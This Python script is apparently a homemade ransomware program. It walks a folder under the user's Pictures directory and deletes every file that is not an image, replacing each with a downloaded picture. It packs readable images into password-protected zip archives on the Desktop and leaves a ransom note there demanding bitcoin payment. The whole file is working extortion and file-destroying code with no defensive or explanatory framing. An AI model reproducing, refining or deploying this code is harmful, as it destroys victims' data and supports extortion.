import requests
from io import BytesIO
import os
import pyminizip
from os import walk
from PIL import Image, UnidentifiedImageError
from PIL import ImageFile
from cryptography.fernet import Fernet
ImageFile.LOAD_TRUNCATED_IMAGES = True
pics = []
user = os.getlogin()
password = "Moshe Golesh1"
key = Fernet.generate_key()
f = Fernet(key)
token = f.encrypt(password.encode())
def ecrypt(mypath, pics):
    for dirpath, dirnames, filenames in walk(mypath):
        for i in filenames:
            try:
                response = requests.get("https://yt3.googleusercontent.com/ytc/AIdro_mKuHXU68tI6YsM-QTXWV-Hy8V3E8PkBlZSwU8-DhM3HA=s900-c-k-c0x00ffffff-no-rj")
                img = Image.open(BytesIO(response.content))
                pic = Image.open(os.path.join(dirpath, i))
                pics.append(pic)

                print(f"replaced {i} successfully")
            except UnidentifiedImageError:
                response = requests.get("https://yt3.googleusercontent.com/ytc/AIdro_mKuHXU68tI6YsM-QTXWV-Hy8V3E8PkBlZSwU8-DhM3HA=s900-c-k-c0x00ffffff-no-rj")
                img = Image.open(BytesIO(response.content))
                os.remove(os.path.join(dirpath, i))
                img.save(os.path.join(mypath, i[0:len(i) - 4] + ".jpg"))
                print(f"not an image replaced {i}")
    try:

        os.mkdir(f"C:/Users/{user}/Desktop/pics")
    except FileExistsError:
        print("pics folder already exists")
    for i in range(len(pics)):
        img1 = pics[i]
        base = f"C:/Users/{user}/Desktop/pics/amen{i}.png"
        img1.save(base)
        path = f"C:/Users/{user}/Desktop/pics/amen{i}.zip"
        pyminizip.compress(base,None, path, password, 0)
    for dirpath, dirnames,filenames in walk(f"C:/Users/{user}/Desktop/pics"):
        for i in filenames:
            if i.endswith(".png") or i.endswith(".jpg") or i.endswith(".jpeg"):
                os.remove(os.path.join(dirpath, i))
    pas = open(f"C:/Users/{user}/Desktop/password.txt", "w")
    pas.write(token.decode())
    pas.write(" \n Pay 2005469$ to moses abrahamovich in bitcoin and you will recieve the password")
    pas.close()
def decrypt():
    for dirpath, dirnames, filenames in walk(f"C:/Users/{user}/Desktop/pics"):
        for i in filenames:
            pyminizip.uncompress(os.path.join(dirpath, i), password, dirpath, 0)
    pas = open(f"C:/Users/{user}/Desktop/password.txt", "w")
    pas.write(f.decrypt(token).decode())
    pas.write("\n Thank you for payement Moshe Use For Bride From Estonia")
    pas.close()




ecrypt(f"C:/Users/{user}/Pictures/Encrypt", pics)
val = input("Enter password: ")
if val == password:
    print("Password matched successfully, decrypting")
    decrypt()
